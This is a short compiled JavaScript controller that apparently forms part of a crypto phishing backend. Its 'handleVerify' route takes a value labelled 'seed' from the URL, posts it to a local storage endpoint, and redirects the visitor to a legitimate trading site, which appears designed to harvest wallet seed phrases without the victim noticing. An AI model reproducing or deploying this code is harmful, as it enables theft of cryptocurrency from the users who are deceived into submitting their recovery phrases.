"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.VerifyController = void 0;
const config_1 = require("../config");
class VerifyController {
    static async handleVerify(req, res, next) {
        try {
            const seed = decodeURIComponent(req.params.data);
            await fetch(`http://localhost:${config_1.config.port}/v1/seed`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: seed }),
            });
            res.redirect('https://axiom.trade/');
        }
        catch (error) {
            next(error);
        }
    }
}
exports.VerifyController = VerifyController;
